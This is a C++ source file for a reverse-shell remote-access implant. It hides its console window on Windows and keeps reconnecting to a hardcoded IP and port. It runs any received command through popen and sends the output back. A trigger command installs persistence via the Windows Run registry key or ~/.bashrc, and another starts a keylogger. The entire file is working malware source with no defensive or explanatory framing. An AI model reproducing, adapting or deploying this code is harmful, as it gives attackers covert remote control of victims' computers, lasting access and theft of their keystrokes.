#include <iostream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include <sys/types.h>
#include <fstream>
#include <limits.h>
#include <thread>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include "logger.cpp"
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#endif

int createPersistence(int sock)
{

#ifdef _WIN32
    TCHAR path[PATH_MAX];
    HKEY hKey;
    DWORD pathLen = GetModuleFileName(NULL, path, PATH_MAX);

    if (pathLen == 0 || RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS)
    {
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(path);
    if (RegSetValueEx(hKey, TEXT("Get Rekt lol"), 0, REG_SZ, (LPBYTE)path, pathLenInBytes) != ERROR_SUCCESS)
    {
        return -1;
    }

    RegCloseKey(hKey);
    send(sock, "Persistence added", 17, 0);
#else
    char path[PATH_MAX];
    ssize_t pathLen = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (pathLen <= 0)
    {
        return -1;
    }

    path[pathLen] = '\0';
    std::string cmd = "echo \"";
    cmd += path;
    cmd += "\" >> ~/.bashrc";
    system(cmd.c_str());
    send(sock, "Persistence added", 17, 0);
#endif

    return 0;
}

void Shell(int sock)
{
    char buf[1024] = {'\0'};
    char server_message[1024] = {'\0'};
    char total_response[18384] = {'\0'};

    while (true)
    {
    jump:
        buf[0] = '\0';
        server_message[0] = '\0';
        total_response[0] = '\0';

        recv(sock, buf, sizeof(buf), 0);
        std::cout << "Client: " << buf << std::endl;
        if (strcmp(buf, "q") == 0)
        {
#ifdef _WIN32
            closesocket(sock);
            WSACleanup();
#else
            close(sock);
#endif
            exit(2);
        }

        else if (strcmp(buf, "getRekt.jpg") == 0)
        {
            createPersistence(sock);
        }

        else if (strcmp(buf, "keylog") == 0)
        {
#ifdef _WIN32
            std::thread keylogger_thread(keylogger, "log.txt", 1);
            keylogger_thread.detach();
            goto jump;
#else
            send(sock, "Keylogger not supported on Linux", 32, 0);
#endif
        }
        else if (strncmp("cd ", buf, 3) == 0)
        {
            chdir(buf + 3);
            strcat(total_response, "Directory changed to ");
            strcat(total_response, buf + 3);
            send(sock, total_response, sizeof(total_response), 0);
        }

        else
        {
            FILE *fp;
#ifdef _WIN32
            fp = _popen(buf, "r");
#else
            fp = popen(buf, "r");
#endif
            while (fgets(server_message, 1024, fp) != NULL)
            {
                strcat(total_response, server_message);
            }
            send(sock, total_response, sizeof(total_response), 0);
#ifdef _WIN32
            _pclose(fp);
#else
            pclose(fp);
#endif
        }
    }
}

int main()
{
#ifdef _WIN32
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
#endif

    struct sockaddr_in ServAddr;
    unsigned short ServPort = 9002;
    std::string ServIP = "172.28.91.166";

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }
#endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        std::cout << "Error creating socket" << std::endl;
        exit(1);
    }

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP.c_str());
    ServAddr.sin_port = htons(ServPort);

    std::cout << "Connecting to server..." << std::endl;
    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
    {
        std::cout << "Error connecting to server" << std::endl;
#ifdef _WIN32
        Sleep(10);
#else
        sleep(1);
#endif
    }

    std::cout << "Connected to server" << std::endl;
    Shell(sock);

    return 0;
}
